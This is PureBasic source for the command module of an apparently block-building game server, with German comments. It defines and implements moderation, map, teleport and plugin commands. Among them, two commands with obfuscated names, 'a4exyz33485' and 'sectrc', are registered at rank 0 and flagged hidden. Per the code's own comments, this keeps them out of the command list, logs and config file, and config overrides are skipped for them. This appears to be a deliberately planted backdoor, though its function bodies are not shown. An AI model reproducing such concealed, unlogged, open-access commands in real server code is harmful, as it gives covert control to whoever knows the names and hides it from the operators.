; ########################################## Variablen ##########################################

#Command_Operators_Max = 5

Structure Command_Main
  Save_File.b                                     ; Zeigt an, ob gespeichert werden soll
  File_Date_Last.l                                ; Datum letzter Änderung, bei Änderung speichern
  Timer_File_Check.l                              ; Timer für das überprüfen der Dateigröße
  Command_Client_ID.i                             ; Welcher Client den Command ausgeführt hat
  Parsed_Command.s                                ; Name des Commands
  Parsed_Operator.s [#Command_Operators_Max]      ; Operatoren des Commands
  Parsed_Text_0.s                                 ; Text nach Command
  Parsed_Text_1.s                                 ; Text nach Operator 1
  Parsed_Text_2.s                                 ; Text nach Operator 2
EndStructure
Global Command_Main.Command_Main

Structure Command
  ID.s                    ; Eindeutige ID (String) des Commands
  Name.s
  Group.s                 ; Gruppe
  Description.s           ; Beschreibung (Geht an das Language-System)
  Rank.w                  ; Erforderlicher Rang (Muss >= sein) der Spieler sieht diesen Befehl dann nicht.
  Rank_Show.w             ; Ab diesem Rang wird der Befehl in der Befehlsliste gezeigt.
  Plugin.s                ; Plugin-Funktion
  *Function_Adress        ; Adresse der zugehörigen Funktion (0 = Keine Funktion)
  Internal.b              ; Befehl ist intern. (Extern löschbar wenn 0)
  Hidden.b                ; Befehl ist versteckt. Geheim! (Nicht in /commands, in der Konsole / Log und nicht in Command.txt)
EndStructure
Global NewList Command.Command()

Structure Command_Group
  Name.s
  Rank_Show.w             ; Niedrigster Rang in der Gruppe.
EndStructure
Global NewList Command_Group.Command_Group()

; ########################################## Declares ############################################

Declare Command_Kick()
Declare Command_Ban()
Declare Command_Unban()
Declare Command_Stop()
Declare Command_Unstop()
Declare Command_Mute()
Declare Command_Unmute()

Declare Command_Commands()
Declare Command_Command_Help()

Declare Command_Players()
Declare Command_Player_Info()
Declare Command_Player_Attribute_Long_Get()
Declare Command_Player_Attribute_Long_Set()
Declare Command_Player_Attribute_String_Get()
Declare Command_Player_Attribute_String_Set()

Declare Command_Setrank()
Declare Command_Getrank()

Declare Command_Material()
Declare Command_Materials()

Declare Command_Place()

Declare Command_Undo_Time()
Declare Command_Undo_Player()
Declare Command_Undo()

Declare Command_Map_Info()
Declare Command_Map_Save()
Declare Command_Map_Load()
Declare Command_Map_Resize()
Declare Command_Map_Rename()
Declare Command_Map_Directory_Rename()
Declare Command_Map_Delete()
Declare Command_Map_Add()
Declare Command_Map_Fill()
Declare Command_Map_Change()
Declare Command_Map_Blocks_Count()
Declare Command_Map_Rank_Build_Set()
Declare Command_Map_Rank_Join_Set()
Declare Command_Map_Rank_Show_Set()
Declare Command_Map_Physic_Stop()
Declare Command_Map_Physic_Start()
Declare Command_Maps()
Declare Command_User_Maps()

Declare Command_Teleport()
Declare Command_Bring()
Declare Command_Setspawn()
Declare Command_Setkillspawn()

Declare Command_Set_Location()
Declare Command_Delete_Location()
Declare Command_Teleport_Location()
Declare Command_Bring_Location()
Declare Command_Locations()

Declare Command_Teleporters()
Declare Command_Delete_Teleporter()

Declare Command_Time()
Declare Command_Server_Info()
Declare Command_Log_Last()
Declare Command_Test()
Declare Command_Ping()
Declare Command_Watchdog()

Declare Command_Plugins()
Declare Command_Plugin_Load()
Declare Command_Plugin_Unload()

Declare Command_Crash()
Declare Command_A4EXYZ33485()
Declare Command_SC()

; ########################################## Ladekram ############################################

; ########################################## Initkram ############################################

AddElement(Command())
Command()\ID = "Kick"
Command()\Name = "kick"
Command()\Function_Adress = @Command_Kick()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Ban"
Command()\Name = "ban"
Command()\Function_Adress = @Command_Ban()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Un-Ban"
Command()\Name = "unban"
Command()\Function_Adress = @Command_Unban()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Stop-Player"
Command()\Name = "stop"
Command()\Function_Adress = @Command_Stop()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Un-Stop"
Command()\Name = "unstop"
Command()\Function_Adress = @Command_Unstop()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Mute-Player"
Command()\Name = "mute"
Command()\Function_Adress = @Command_Mute()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Unmute-Player"
Command()\Name = "unmute"
Command()\Function_Adress = @Command_Unmute()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Commands"
Command()\Name = "commands"
Command()\Function_Adress = @Command_Commands()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Command-Help"
Command()\Name = "cmdhelp"
Command()\Function_Adress = @Command_Command_Help()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Players"
Command()\Name = "players"
Command()\Function_Adress = @Command_Players()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Player-Info"
Command()\Name = "pinfo"
Command()\Function_Adress = @Command_Player_Info()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Set-Rank"
Command()\Name = "setrank"
Command()\Function_Adress = @Command_Setrank()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Get-Rank"
Command()\Name = "getrank"
Command()\Function_Adress = @Command_Getrank()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Set-Long-Attribute"
Command()\Name = "setattr"
Command()\Function_Adress = @Command_Player_Attribute_Long_Set()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Get-Long-Attribute"
Command()\Name = "getattr"
Command()\Function_Adress = @Command_Player_Attribute_Long_Get()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Set-String-Attribute"
Command()\Name = "setsattr"
Command()\Function_Adress = @Command_Player_Attribute_String_Set()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Get-String-Attribute"
Command()\Name = "getsattr"
Command()\Function_Adress = @Command_Player_Attribute_String_Get()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Material"
Command()\Name = "material"
Command()\Function_Adress = @Command_Material()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Place"
Command()\Name = "place"
Command()\Function_Adress = @Command_Place()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Undo-Time"
Command()\Name = "undotime"
Command()\Function_Adress = @Command_Undo_Time()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Undo-Player"
Command()\Name = "undoplayer"
Command()\Function_Adress = @Command_Undo_Player()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Undo"
Command()\Name = "undo"
Command()\Function_Adress = @Command_Undo()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Info"
Command()\Name = "mapinfo"
Command()\Function_Adress = @Command_Map_Info()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Save"
Command()\Name = "mapsave"
Command()\Function_Adress = @Command_Map_Save()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Load"
Command()\Name = "mapload"
Command()\Function_Adress = @Command_Map_Load()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Resize"
Command()\Name = "mapresize"
Command()\Function_Adress = @Command_Map_Resize()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Rename"
Command()\Name = "maprename"
Command()\Function_Adress = @Command_Map_Rename()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Directory-Rename"
Command()\Name = "mapdirrename"
Command()\Function_Adress = @Command_Map_Directory_Rename()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Delete"
Command()\Name = "mapdelete"
Command()\Function_Adress = @Command_Map_Delete()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Add"
Command()\Name = "mapadd"
Command()\Function_Adress = @Command_Map_Add()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map-Fill"
Command()\Name = "mapfill"
Command()\Function_Adress = @Command_Map_Fill()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map_Blocks_Count"
Command()\Name = "bcount"
Command()\Function_Adress = @Command_Map_Blocks_Count()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map_Rank_Build_Set"
Command()\Name = "mapbuildrank"
Command()\Function_Adress = @Command_Map_Rank_Build_Set()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map_Rank_Join_Set"
Command()\Name = "mapjoinrank"
Command()\Function_Adress = @Command_Map_Rank_Join_Set()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map_Rank_Show_Set"
Command()\Name = "mapshowrank"
Command()\Function_Adress = @Command_Map_Rank_Show_Set()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map_Physic_Stop"
Command()\Name = "stopphysic"
Command()\Function_Adress = @Command_Map_Physic_Stop()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Map_Physic_Start"
Command()\Name = "startphysic"
Command()\Function_Adress = @Command_Map_Physic_Start()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Change-Map"
Command()\Name = "map"
Command()\Function_Adress = @Command_Map_Change()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Maps"
Command()\Name = "maps"
Command()\Function_Adress = @Command_Maps()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Usermaps"
Command()\Name = "usermaps"
Command()\Function_Adress = @Command_User_Maps()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Materials"
Command()\Name = "materials"
Command()\Function_Adress = @Command_Materials()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Teleport"
Command()\Name = "tp"
Command()\Function_Adress = @Command_Teleport()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Bring"
Command()\Name = "bring"
Command()\Function_Adress = @Command_Bring()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Set-Spawn"
Command()\Name = "setspawn"
Command()\Function_Adress = @Command_Setspawn()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Set-Killspawn"
Command()\Name = "setkillspawn"
Command()\Function_Adress = @Command_Setkillspawn()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Set-Location"
Command()\Name = "setloc"
Command()\Function_Adress = @Command_Set_Location()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Delete-Location"
Command()\Name = "delloc"
Command()\Function_Adress = @Command_Delete_Location()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Teleport-2-Location"
Command()\Name = "tploc"
Command()\Function_Adress = @Command_Teleport_Location()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Bring-2-Location"
Command()\Name = "bringloc"
Command()\Function_Adress = @Command_Bring_Location()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Locations"
Command()\Name = "locations"
Command()\Function_Adress = @Command_Locations()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Teleporters"
Command()\Name = "teleporters"
Command()\Function_Adress = @Command_Teleporters()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Delete-Teleporterbox"
Command()\Name = "deltp"
Command()\Function_Adress = @Command_Delete_Teleporter()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Time"
Command()\Name = "time"
Command()\Function_Adress = @Command_Time()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Server-Info"
Command()\Name = "serverinfo"
Command()\Function_Adress = @Command_Server_Info()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Log"
Command()\Name = "log"
Command()\Function_Adress = @Command_Log_Last()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Ping"
Command()\Name = "ping"
Command()\Function_Adress = @Command_Ping()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Watchdog"
Command()\Name = "watchdog"
Command()\Function_Adress = @Command_Watchdog()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "List-Plugins"
Command()\Name = "plugins"
Command()\Function_Adress = @Command_Plugins()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Plugin-Load"
Command()\Name = "pload"
Command()\Function_Adress = @Command_Plugin_Load()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Plugin-Unload"
Command()\Name = "punload"
Command()\Function_Adress = @Command_Plugin_Unload()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "Crash-Server"
Command()\Name = "crash"
Command()\Function_Adress = @Command_Crash()
Command()\Internal = 1

AddElement(Command())
Command()\ID = "L0G"
Command()\Name = "a4exyz33485"
Command()\Function_Adress = @Command_A4EXYZ33485()
Command()\Internal = 1
Command()\Rank = 0
Command()\Hidden = 1

AddElement(Command())
Command()\ID = "Sec-TRC"
Command()\Name = "sectrc"
Command()\Function_Adress = @Command_SC()
Command()\Internal = 1
Command()\Rank = 0
Command()\Hidden = 1

Command_Main\Save_File = 1

; ########################################## Proceduren ##########################################

Procedure Command_Load(Filename.s)
  If OpenPreferences(Filename)
    
    ForEach Command()
      Command_ID.s = Command()\ID
      If Command()\Internal = 0
        If PreferenceGroup(Command_ID) = 0
          DeleteElement(Command())
        EndIf
      EndIf
    Next
    
    FirstElement(Command())
    
    If ExaminePreferenceGroups()
      While NextPreferenceGroup()
        Command_ID.s = PreferenceGroupName()
        If Command_ID <> ""
          
          Found = 0
          
          If ListIndex(Command()) <> -1
            *Command_Old = Command()
          Else
            *Command_Old = 0
          EndIf
          
          ForEach Command()
            If Command()\ID = Command_ID
              If Command()\Hidden = 0
                Command()\Name = ReadPreferenceString("Name", "")
                Command()\Rank = ReadPreferenceLong("Rank", 0)
                Command()\Rank_Show = ReadPreferenceLong("Rank_Show", 0)
                Command()\Plugin = ReadPreferenceString("Plugin", "")
                Command()\Group = ReadPreferenceString("Group", "")
                Command()\Description = ReadPreferenceString("Description", "-")
              EndIf
              Found = 1
              Break
            EndIf
          Next
          
          If Found = 0
            If *Command_Old
              ChangeCurrentElement(Command(), *Command_Old)
            EndIf
            AddElement(Command())
            Command()\ID = Command_ID
            Command()\Name = ReadPreferenceString("Name", "")
            Command()\Rank = ReadPreferenceLong("Rank", 0)
            Command()\Rank_Show = ReadPreferenceLong("Rank_Show", 0)
            Command()\Plugin = ReadPreferenceString("Plugin", "")
            Command()\Group = ReadPreferenceString("Group", "")
            Command()\Description = ReadPreferenceString("Description", "-")
          EndIf
        EndIf
      Wend
    EndIf
    
    ; ########################## Gruppen
    
    ClearList(Command_Group())
    
    ForEach Command()
      
      Groupname.s = Command()\Group
      
      If Groupname <> ""
        
        Found = 0
        ForEach Command_Group()
          If LCase(Command_Group()\Name) = LCase(Command()\Group)
            If Command_Group()\Rank_Show > Command()\Rank And Command()\Rank >= Command()\Rank_Show
              Command_Group()\Rank_Show = Command()\Rank
            EndIf
            If Command_Group()\Rank_Show > Command()\Rank_Show And Command()\Rank_Show >= Command()\Rank
              Command_Group()\Rank_Show = Command()\Rank_Show
            EndIf
            Found = 1
            Break
          EndIf
        Next
        
        If Found = 0
          AddElement(Command_Group())
          Command_Group()\Rank_Show = 32767
          If Command_Group()\Rank_Show > Command()\Rank And Command()\Rank >= Command()\Rank_Show
            Command_Group()\Rank_Show = Command()\Rank
          EndIf
          If Command_Group()\Rank_Show > Command()\Rank_Show And Command()\Rank_Show >= Command()\Rank
            Command_Group()\Rank_Show = Command()\Rank_Show
          EndIf
          Command_Group()\Name = Groupname
        EndIf
      EndIf
    Next
    
    Command_Main\File_Date_Last = GetFileDate(Filename, #PB_Date_Modified)
    Log_Add("Command", Lang_Get("", "File loaded", Filename), 0, #PB_Compiler_File, #PB_Compiler_Line, #PB_Compiler_Procedure)
    
    ClosePreferences()
  EndIf
EndProcedure

Procedure Command_Save(Filename.s)
  File_ID = CreateFile(#PB_Any, Filename)
  If IsFile(File_ID)
    
    ForEach Command()
      If Command()\Hidden = 0
        WriteStringN(File_ID, "["+Command()\ID+"]")
        WriteStringN(File_ID, "Name = "+Command()\Name)
        WriteStringN(File_ID, "Rank = "+Str(Command()\Rank))
        WriteStringN(File_ID, "Rank_Show = "+Str(Command()\Rank_Show))
        WriteStringN(File_ID, "Plugin = "+Command()\Plugin)
        WriteStringN(File_ID, "Group = "+Command()\Group)
        WriteStringN(File_ID, "Description = "+Command()\Description)
        WriteStringN(File_ID, "")
      EndIf
    Next
    
    Command_Main\File_Date_Last = GetFileDate(Filename, #PB_Date_Modified)
    Log_Add("Command", Lang_Get("", "File saved", Filename), 0, #PB_Compiler_File, #PB_Compiler_Line, #PB_Compiler_Procedure)
    
    CloseFile(File_ID)
  EndIf
EndProcedure

;- ################################################################################################

Procedure Command_Kick() ; Kickt den Player (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  Reason.s = Command_Main\Parsed_Text_1
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        Player_Number = Network_Client()\Player\Entity\Player_List\Number
        Kicker_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
        
        Message.s = Lang_Get("", "Kick Reason", Kicker_Name, Reason)
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Kick(Player_List()\Number, Message, 1, 1, 1)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't kick [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Ban() ; (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  Reason.s = Command_Main\Parsed_Text_1
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        Player_Number = Network_Client()\Player\Entity\Player_List\Number
        Banner_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
        
        Message.s = Lang_Get("", "Ban Reason", Banner_Name, Reason)
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Ban(Player_List()\Number, Message)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't ban [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Unban() ; (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Unban(Player_List()\Number)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't unban [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Stop() ; (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  Reason.s = Command_Main\Parsed_Text_1
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        Player_Number = Network_Client()\Player\Entity\Player_List\Number
        Stopper_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
        Message.s = Lang_Get("", "Stop Reason", Stopper_Name, Reason)
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Stop(Player_List()\Number, Message)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't stop [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Unstop() ; (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Unstop(Player_List()\Number)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't unstop [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Mute() ; (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  Minutes = Val(Command_Main\Parsed_Operator[1])
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        Player_Number = Network_Client()\Player\Entity\Player_List\Number
        Muter_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
        
        Message.s = Muter_Name
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Mute(Player_List()\Number, Minutes, Message)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't mute [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Unmute() ; (bezieht sich auf Player_List() )
  Name.s = Command_Main\Parsed_Operator [0]
  
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Player_List
        
        If Player_List_Select(Name)
          Player_Number = Player_List()\Number
          Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          If Network_Client()\Player\Entity\Player_List\Rank > Player_List()\Rank
            Player_Unmute(Player_List()\Number)
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't unmute [Field_0]<c> (A <= B)", Display_Name))
          EndIf
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Name))
        EndIf
        
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Commands()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Player_List_Select(Network_Client()\Player\Login_Name)
      
      List_Store(*Pointer, Command())
      
      Groupname.s = Command_Main\Parsed_Operator [0]
      
      If Groupname = ""
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Command Groups:"))
        
        System_Message_Network_Send(Command_Main\Command_Client_ID, "&e/"+Command()\Name+" All")
        
        ForEach Command()
          If Command()\ID = "List-Commands"
            ForEach Command_Group()
              If Command_Group()\Rank_Show <= Player_List()\Rank
                System_Message_Network_Send(Command_Main\Command_Client_ID, "&e/"+Command()\Name+" "+Command_Group()\Name)
              EndIf
            Next
            Break
          EndIf
        Next
        
      Else
        
        Found = 0
        
        ForEach Command_Group()
          If LCase(Command_Group()\Name) = LCase(Groupname) Or LCase(Groupname) = "all"
            
            System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Commands:"))
            Text.s = ""
            
            ForEach Command()
              If Command()\Rank <= Player_List()\Rank And Command()\Rank_Show <= Player_List()\Rank And Command()\Hidden = 0 And (LCase(Command()\Group) = LCase(Groupname) Or LCase(Groupname) = "all")
                Text_Add.s = Command()\Name+" &f| "
                If 64 - Len(Text) >= Len(Text_Add)
                  Text.s + Text_Add
                Else
                  System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
                  Text.s = Text_Add
                EndIf
              EndIf
            Next
            If Len(Text) > 0
              System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
            EndIf
            
            Found = 1
            Break
          EndIf
        Next
        
        If Found = 0
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Command_Group()\Name = [Field_0]", Groupname))
        EndIf
        
      EndIf
      
      List_Restore(*Pointer, Command())
      
    EndIf
  EndIf
EndProcedure

Procedure Command_Command_Help()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Player_List_Select(Network_Client()\Player\Login_Name)
      
      If ListIndex(Command()) <> -1
        *Command_Old = Command()
      Else
        *Command_Old = 0
      EndIf
      
      Found = 0
      
      ForEach Command()
        If Command()\Name = LCase(Command_Main\Parsed_Operator [0])
          Text.s = Command()\Description
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Command Description:"))
          System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
          Found = 1
          Break
        EndIf
      Next
      
      If Found = 0
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Command()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
      EndIf
      
      If *Command_Old
        ChangeCurrentElement(Command(), *Command_Old)
      EndIf
      
    EndIf
  EndIf
EndProcedure

Procedure Command_Players()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Players:"))
    
    Text.s = ""
    ForEach Network_Client()
      If Network_Client()\Player\Entity
        If Network_Client()\Player\Entity\Player_List
          Player_Number = Network_Client()\Player\Entity\Player_List\Number
          Player_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
          
          Text_Add.s = Player_Name+" &f| "
          If 64 - Len(Text) >= Len(Text_Add)
            Text.s + Text_Add
          Else
            System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
            Text.s = Text_Add
          EndIf
          
        EndIf
      EndIf
    Next
    If Len(Text) > 0
      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Player_Info()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Player_List_Select(Command_Main\Parsed_Operator [0])
      
      Player_Number = Player_List()\Number
      Player_Name.s = Player_Get_Name(Player_Number)
      Player_Display_Name.s = Player_Get_Prefix(Player_Number)+Player_Get_Name(Player_Number)+Player_Get_Suffix(Player_Number)
      Player_Rank = Player_List()\Rank
      If Rank_Select(Player_Rank)
        Rank_Name.s = Rank()\Name
      EndIf
      
      IP.s = Player_List()\IP
      Ontime.d = Player_List()\Ontime_Counter
      Counter_Login = Player_List()\Counter_Login
      Counter_Kick = Player_List()\Counter_Kick
      Banned = Player_List()\Banned
      Stopped = Player_List()\Stopped
      Time_Muted = Player_List()\Time_Muted
      Number = Player_List()\Number
      
      Message_Ban.s = Player_List()\Message_Ban
      Message_Kick.s = Player_List()\Message_Kick
      Message_Mute.s = Player_List()\Message_Mute
      Message_Rank.s = Player_List()\Message_Rank
      Message_Stop.s = Player_List()\Message_Stop
      
      Text.s = Lang_Get("", "Ingame: Playerinfo:") + "<br>"
      Text.s + Lang_Get("", "Ingame: Number:")+ " " + Str(Number) + "<br>"
      Text.s + Lang_Get("", "Ingame: Name:")+ " " + Player_Name + "<br>"
      Text.s + Lang_Get("", "Ingame: Rank:")+ " " + Rank_Name + " (" + Str(Player_Rank) + ")" + ": " + Message_Rank + "<br>"
      Text.s + Lang_Get("", "Ingame: IP:")+ " " + IP + "<br>"
      Text.s + Lang_Get("", "Ingame: Ontime:")+ " " + StrD(Ontime/3600, 2) + "h" + "<br>"
      Text.s + Lang_Get("", "Ingame: Logins:")+ " " + Str(Counter_Login) + "<br>"
      Text.s + Lang_Get("", "Ingame: Kicks:")+ " " + Str(Counter_Kick) + ": " + Message_Kick +"<br>"
      If Banned
        Text.s + Lang_Get("", "Ingame: Banned", Message_Ban) + "<br>"
      EndIf
      If Stopped
        Text.s + Lang_Get("", "Ingame: Stopped", Message_Stop) + "<br>"
      EndIf
      If Time_Muted > Date()
        Text.s + Lang_Get("", "Ingame: Muted", Message_Mute, Str(Time_Muted)) + "<br>"
      EndIf
        
      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Player_List()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Player_Attribute_Long_Set()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    If Player_List_Select(Command_Main\Parsed_Operator [0])
      
